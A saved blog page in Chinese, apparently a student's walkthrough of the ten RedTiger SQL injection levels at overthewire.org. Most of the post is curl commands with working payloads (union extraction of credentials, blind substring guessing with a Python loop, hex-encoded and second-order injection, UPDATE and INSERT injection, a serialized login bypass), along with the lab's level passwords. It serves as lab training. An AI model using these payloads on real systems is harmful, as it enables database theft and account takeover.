@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript">
+    var host = "dd3.org";
+    if ((host == window.location.host) && (window.location.protocol != "https:"))
+        window.location.protocol = "https";
+</script>
+  <meta charset="utf-8">
+  
+  <title>玩 redtiger SQL 注入 10 关 | 风吹雪</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈
+传送门：https://redtiger.labs.overthewire.org/
+下面是流水账，想自己先玩的就随意罗">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玩 redtiger SQL 注入 10 关">
+<meta property="og:url" content="http://dd3.org/2018/04/10/玩-redtiger-SQL-注入-10-关/index.html">
+<meta property="og:site_name" content="风吹雪">
+<meta property="og:description" content="以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈
+传送门：https://redtiger.labs.overthewire.org/
+下面是流水账，想自己先玩的就随意罗">
+<meta property="og:updated_time" content="2018-04-10T14:50:36.643Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="玩 redtiger SQL 注入 10 关">
+<meta name="twitter:description" content="以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈
+传送门：https://redtiger.labs.overthewire.org/
+下面是流水账，想自己先玩的就随意罗">
+  
+  
+    <link rel="icon" href="favicon.png">
+  
+  
+ <link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,400,600' rel='stylesheet' type='text/css'>
+ <link href='https://fonts.googleapis.com/css?family=Source+Code+Pro' rel='stylesheet' type='text/css'>
+
+
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-68097865-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+
+  
+</head>
+
+<body>
+  <div id="container">
+    <header id="header">
+  <div id="header-main" class="header-inner">
+    <div class="outer">
+      <a href="/" id="logo"><span class="site-title">风吹雪</span></a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/.">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      
+        <nav id="sub-nav">
+          <div class="profile" id="profile-nav">
+            <a id="profile-anchor" href="javascript:;"><img class="avatar" src="https://avatars2.githubusercontent.com/u/3396288?v=3&amp;u=74fefc488bbb61f586d64cfcb07fd25d426628fe&amp;s=128"><i class="fa fa-caret-down"></i></a>
+          </div>
+        </nav>
+      
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"> </button><input type="hidden" name="sitesearch" value="http://dd3.org"></form>
+      </div>
+    </div>
+  </div>
+  <div id="main-nav-mobile" class="header-sub header-inner">
+    <table class="menu outer">
+      <tr>
+        
+          <td><a class="main-nav-link" href="/.">Home</a></td>
+        
+          <td><a class="main-nav-link" href="/archives">Archives</a></td>
+        
+          <td><a class="main-nav-link" href="/about">About</a></td>
+        
+        <td>
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="hidden" name="sitesearch" value="http://dd3.org"></form>
+        </td>
+      </tr>
+    </table>
+  </div>
+</header>
+
+    <div class="outer">
+      
+        <aside id="profile">
+  <div class="inner profile-inner">
+    <div class="base-info profile-block">
+      <img id="avatar" src="https://avatars2.githubusercontent.com/u/3396288?v=3&amp;u=74fefc488bbb61f586d64cfcb07fd25d426628fe&amp;s=128">
+      <h2 id="name">vienna</h2>
+      <h3 id="title">学生</h3>
+      <span id="location"><i class="fa fa-map-marker"></i>Hong Kong, China</span>
+      <a id="follow" href="https://github.com/viennadd/">FOLLOW</a>
+    </div>
+    <div class="article-info profile-block">
+      <div class="article-info-block">
+        21
+        <span>posts</span>
+      </div>
+      <div class="article-info-block">
+        15
+        <span>tags</span>
+      </div>
+    </div>
+    
+    <div class="contact-info profile-block">
+      <table class="contact-list">
+        <tr>
+          
+          <td><a href="http://github.com/viennadd" target="_blank" title="github"><i class="fa fa-github"></i></a></td>
+          
+          <td><a href="/atom.xml" target="_blank" title="rss"><i class="fa fa-rss"></i></a></td>
+          
+        </tr>
+      </table>
+    </div>
+    
+    
+  </div>
+</aside>
+
+      
+      <section id="main"><article id="post-玩-redtiger-SQL-注入-10-关" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      玩 redtiger SQL 注入 10 关
+    </h1>
+  
+
+        <div class="article-meta">
+          
+  <div class="article-date">
+    <i class="fa fa-calendar"></i>
+    <a href="/2018/04/10/玩-redtiger-SQL-注入-10-关/">
+      <time datetime="2018-04-10T14:31:42.000Z" itemprop="datePublished">2018-04-10</time>
+    </a>
+  </div>
+
+
+          
+  <div class="article-category">
+  	<i class="fa fa-folder"></i>
+    <a class="article-category-link" href="/categories/Tech-Notes/">Tech Notes</a>
+  </div>
+
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+                
+        <p>以前从来没试过手动 SQL 注入，这个系列挺适合我这种程度的哈哈</p>
+<p>传送门：<a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="external">https://redtiger.labs.overthewire.org/</a></p>
+<p>下面是流水账，想自己先玩的就随意罗</p>
+<a id="more"></a>
+<h4 id="level_1">level 1</h4><p>cat 参数是注入点，没有明显回显，使用 1=1 ， 1=2 等可以确认，<br>使用 union 捞出数据<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &quot;https://redtiger.labs.overthewire.org/level1.php?cat=2/**/union/**/select/**/99,100,username,password/**/from/**/level1_users;--“;</div></pre></td></tr></table></figure></p>
+<h4 id="level_2">level 2</h4><p>简单条件，单引号拼接<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">--data &quot;username=a&amp;password=a&apos;+or+&apos;1&apos;=&apos;1&amp;login=Login”</div><div class="line">a’ or &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></p>
+<h4 id="level_3">level 3</h4><p>提示说需要 trigger error，完了一顿时间没有头绪，看了答案，学会了触发类型错误，</p>
+<p>需要在 usr 参数用 usr[0]=xxxx 来触发类型错误，再从出错提示中拿到 inc 文件，直接访问 inc 文件可以拿到源码，<br>之后就是把 sql 语句经过源码加解密来触发了</p>
+<h4 id="level_4">level 4</h4><p>使用substring 数值猜解 cell 值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &quot;https://redtiger.labs.overthewire.org/level4.php?id=1/**/union/**/select/**/keyword,2/**/from/**/level4_secret/**/where/**/ascii(substring(keyword,1,1))=107;--&quot;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug&apos; -H &apos;Connection: keep-alive&apos; --compressed</div></pre></td></tr></table></figure>
+<p>下面是简单枚举，可以改用二分查找减少请求，又使用并发缩短时间 </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(ascii_val)</span>:</span></div><div class="line">    p = subprocess.Popen([<span class="string">"bash"</span>, <span class="string">"-c"</span>, command % (i,ascii_val)], stdout=subprocess.PIPE)</div><div class="line">    out, _ = p.communicate()</div><div class="line">    out = out.decode()</div><div class="line">    print(out)</div><div class="line">    <span class="keyword">return</span> <span class="string">"Query returned 2 rows"</span> <span class="keyword">in</span> out</div><div class="line"></div><div class="line"></div><div class="line">hits = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">25</span>):</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</div><div class="line">        <span class="keyword">if</span> check(c):</div><div class="line">            print(c)</div><div class="line">            hits.append(c)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure>
+<h4 id="level_5">level 5</h4><p>从hints 理解，就算拿到 password，也不能登入，限制了函数其实也是缩窄了范围，<br>解法就是自己提供一组可登入的数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &apos;https://redtiger.labs.overthewire.org/level5.php?mode=login&apos;; -H &apos;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck&apos; -H &apos;Origin: https://redtiger.labs.overthewire.org&apos;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Content-Type: application/x-www-form-urlencoded&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Referer: https://redtiger.labs.overthewire.org/level5.php?mode=login&apos;; -H &apos;Connection: keep-alive&apos; --data &quot;username=a&apos; union all select &apos;1&apos;,&apos;534b44a19bf18d20b71ecc4eb77c572f&amp;password=alex&amp;login=Login&quot; --compressed</div></pre></td></tr></table></figure>
+<h4 id="level_6">level 6</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &quot;https://redtiger.labs.overthewire.org/level6.php?user=-1/**/or/**/status=11/**/union/**/select/**/username,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f75736572732077686572652069643d33202d2d20/**/as/**/username,username,2,username/**/from/**/level6_users&quot;; -H &apos;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7&apos; -H &apos;Origin: https://redtiger.labs.overthewire.org&apos;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Content-Type: application/x-www-form-urlencoded&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Referer: https://redtiger.labs.overthewire.org/level6.php?user=1&apos;; -H &apos;Connection: keep-alive&apos; --data &apos;user=admin&amp;password=admin&amp;login=Login&apos; —compressed</div></pre></td></tr></table></figure>
+<h5 id="发现">发现</h5><p>从 user 里直接注入 union 并不影响输出，但会有 user not found 的错误提示，说明会根据 user 的 id 先拿到一个 username，再从 username 拿一次 user 数据，</p>
+<h5 id="结果">结果</h5><p>不会做，翻了答案才知道可以间接注入，把用户名注入成另外一句 payload，当进行第二次 query 时触发数据替换，把邮件换成密码来显示<br>看了答案除了学会这招迂回注入，还发现可以用十六进制绕开 mysql_real_escape_string 的单引号过滤，hmmm</p>
+<h4 id="level_7">level 7</h4><h5 id="发现-1">发现</h5><p> sql 语法错误后会打印错误信息，发现整条 <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &apos;%xxx%&apos; OR text.title LIKE &apos;%xxx%’)</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><figcaption><span>news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE ‘%’ union select 1,2,3,4,5,6 from  level7_texts text where text.title ='%' OR text.title LIKE '%xxx%’)```</span></figcaption><table><tr><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">先拼接一条合法的注入，再想办法拿到 google 相关文章的作者</div></pre></td></tr></table></figure>
+<p> curl ‘<a href="https://redtiger.labs.overthewire.org/level7.php" target="_blank" rel="external">https://redtiger.labs.overthewire.org/level7.php</a>‘; -H ‘Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind’ -H ‘Origin: <a href="https://redtiger.labs.overthewire.org" target="_blank" rel="external">https://redtiger.labs.overthewire.org</a>‘; -H ‘Accept-Encoding: gzip, deflate, br’ -H ‘Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6’ -H ‘Upgrade-Insecure-Requests: 1’ -H ‘User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36’ -H ‘Content-Type: application/x-www-form-urlencoded’ -H ‘Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8’ -H ‘Cache-Control: max-age=0’ -H ‘Referer: <a href="https://redtiger.labs.overthewire.org/level7.php" target="_blank" rel="external">https://redtiger.labs.overthewire.org/level7.php</a>‘; -H ‘Connection: keep-alive’ –data “search=’) union select 1,2,autor,4 from level7_news news, level7_texts text where autor=’1’ or (autor=’&amp;dosearch=search%21” —compressed<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line">把上条的条件改成 always true，拿出了所有数据，然后得到 google 文章的作者</div><div class="line">```curl &apos;https://redtiger.labs.overthewire.org/level7.php&apos;; -H &apos;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind&apos; -H &apos;Origin: https://redtiger.labs.overthewire.org&apos;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Content-Type: application/x-www-form-urlencoded&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Referer: https://redtiger.labs.overthewire.org/level7.php&apos;; -H &apos;Connection: keep-alive&apos; --data &quot;search=&apos;) union select 1,2,autor,4 from level7_news news, level7_texts text where &apos;1&apos;=&apos;1&apos; or (autor=&apos;&amp;dosearch=search%21&quot; —compressed</div></pre></td></tr></table></figure></p>
+<h4 id="level_8">level 8</h4><p>反复摆弄后，会发现真的会执行一条 update 语句，似乎只有 email 项可以注入，给update 时拼一个 password，就会把密码覆盖，这样就可以登入了<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &apos;https://redtiger.labs.overthewire.org/level8.php&apos;; -H &apos;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic&apos; -H &apos;Origin: https://redtiger.labs.overthewire.org&apos;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Content-Type: application/x-www-form-urlencoded&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Referer: https://redtiger.labs.overthewire.org/level8.php&apos;; -H &apos;Connection: keep-alive&apos; --data &quot;email=hans%40local&apos;, password=&apos;13&amp;name=Hans&amp;icq=12345/*or&amp;age=25*/&amp;edit=Edit&amp;user=admin&amp;password=13&amp;login=Login&quot; —compressed</div></pre></td></tr></table></figure></p>
+<h4 id="level_9">level 9</h4><p>虽然发现注入点在 text 项，但怎么也想不明白，一条 update 语句怎样才能操作好，<br>看了别人的答案后。。。。这似乎是一条 insert。。。。。。嗯，顺便学了下 insert 也可以 somehow 显示数据<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &apos;https://redtiger.labs.overthewire.org/level9.php&apos;; -H &apos;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic; level9login=cybercyber_vuln&apos; -H &apos;Origin: https://redtiger.labs.overthewire.org&apos;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Content-Type: application/x-www-form-urlencoded&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Referer: https://redtiger.labs.overthewire.org/level9.php&apos;; -H &apos;Connection: keep-alive&apos; --data &quot;autor=alex&amp;title=alexortitle&amp;text=aa&apos;), ((select username from level9_users limit 1), (select password from level9_users limit 1), &apos;a&amp;post=Submit&quot; —compressed</div></pre></td></tr></table></figure></p>
+<h4 id="level_10">level 10</h4><p>测试了username 和 password 都不能注入，<br>想不明白就看了答案，原来是一题和 serialize 函数有关的题目，<br>答案是把类型改成 boolean，难道源码内根据这些类型生成 sql / 作判断吗？<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl &apos;https://redtiger.labs.overthewire.org/level10.php&apos;; -H &quot;Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug; level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7; level7login=keep_in_mind_im_not_blind; level8login=no_pernel_kanic_on_the_titanic; level9login=cybercyber_vuln; level10login=get_post_cookie_head__kittens_eating_all_my_bread&quot; -H &apos;Origin: https://redtiger.labs.overthewire.org&apos;; -H &apos;Accept-Encoding: gzip, deflate, br&apos; -H &apos;Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&apos; -H &apos;Upgrade-Insecure-Requests: 1&apos; -H &apos;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&apos; -H &apos;Content-Type: application/x-www-form-urlencoded&apos; -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos; -H &apos;Cache-Control: max-age=0&apos; -H &apos;Referer: https://redtiger.labs.overthewire.org/level10.php&apos;; -H &apos;Connection: keep-alive&apos; --data &quot;login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30&amp;dologin=Login&quot; —compressed</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dd3.org/2018/04/10/玩-redtiger-SQL-注入-10-关/" data-id="cjfts9kc40015r1gr5sqsgcd9" class="article-share-link">Share</a>
+      
+        <a href="http://dd3.org/2018/04/10/玩-redtiger-SQL-注入-10-关/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-Injection/">SQL Injection</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/06/2017-关西游记/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2017 关西游记</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</section>
+      
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">recents</h3>
+    <div class="widget">
+      <ul id="recent-post" class="">
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              <a href="/2018/04/10/玩-redtiger-SQL-注入-10-关/" class="thumbnail">
+  
+    <span class="thumbnail-image thumbnail-none"></span>
+  
+</a>
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Tech-Notes/">Tech Notes</a></p>
+              <p class="item-title"><a href="/2018/04/10/玩-redtiger-SQL-注入-10-关/" class="title">玩 redtiger SQL 注入 10 关</a></p>
+              <p class="item-date"><time datetime="2018-04-10T14:31:42.000Z" itemprop="datePublished">2018-04-10</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              <a href="/2018/01/06/2017-关西游记/" class="thumbnail">
+  
+    <span style="background-image:url(/img/关西游记/IMG_0130.jpg
+)" alt="2017 关西游记" class="thumbnail-image"></span>
+  
+</a>
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/生活/">生活</a></p>
+              <p class="item-title"><a href="/2018/01/06/2017-关西游记/" class="title">2017 关西游记</a></p>
+              <p class="item-date"><time datetime="2018-01-06T13:37:40.000Z" itemprop="datePublished">2018-01-06</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              <a href="/2017/07/29/韩剧《记忆》/" class="thumbnail">
+  
+    <span style="background-image:url(/img/韩剧《记忆》/memory.jpg
+)" alt="韩剧《记忆》" class="thumbnail-image"></span>
+  
+</a>
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Drama/">Drama</a></p>
+              <p class="item-title"><a href="/2017/07/29/韩剧《记忆》/" class="title">韩剧《记忆》</a></p>
+              <p class="item-date"><time datetime="2017-07-29T14:42:00.000Z" itemprop="datePublished">2017-07-29</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              <a href="/2017/03/04/刚刚看了《海边的曼切斯特》/" class="thumbnail">
+  
+    <span style="background-image:url(/img/Manchester_By_The_Sea/theboat.png
+)" alt="刚刚看了《海边的曼切斯特》" class="thumbnail-image"></span>
+  
+</a>
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Drama/">Drama</a></p>
+              <p class="item-title"><a href="/2017/03/04/刚刚看了《海边的曼切斯特》/" class="title">刚刚看了《海边的曼切斯特》</a></p>
+              <p class="item-date"><time datetime="2017-03-04T13:00:45.000Z" itemprop="datePublished">2017-03-04</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              <a href="/2017/03/01/成功把门禁的-NFC-UID-复制到手机/" class="thumbnail">
+  
+    <span class="thumbnail-image thumbnail-none"></span>
+  
+</a>
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Tech-Notes/">Tech Notes</a></p>
+              <p class="item-title"><a href="/2017/03/01/成功把门禁的-NFC-UID-复制到手机/" class="title">成功把门禁的 NFC UID 复制到手机</a></p>
+              <p class="item-date"><time datetime="2017-02-28T16:35:10.000Z" itemprop="datePublished">2017-03-01</time></p>
+            </div>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap widget-list">
+    <h3 class="widget-title">links</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="https://twd2.me">22</a>
+          </li>
+        
+          <li>
+            <a href="http://44670.org/">气泡熊</a>
+          </li>
+        
+          <li>
+            <a href="http://newbiecoder.0ginr.com/blog/">炉子</a>
+          </li>
+        
+          <li>
+            <a href="http://xiaoxia.org/">小虾</a>
+          </li>
+        
+          <li>
+            <a href="http://chichou.0ginr.com/blog/">CC</a>
+          </li>
+        
+          <li>
+            <a href="https://shadowmov.cn">大表哥</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+  <div id="toTop" class="fa fa-chevron-up"></div>
+</aside>
+      
+    </div>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2015 - 2018 vienna<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
+    </div>
+  </div>
+</footer>
+    
+
+<script>
+  var disqus_shortname = 'dd3';
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+
+
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
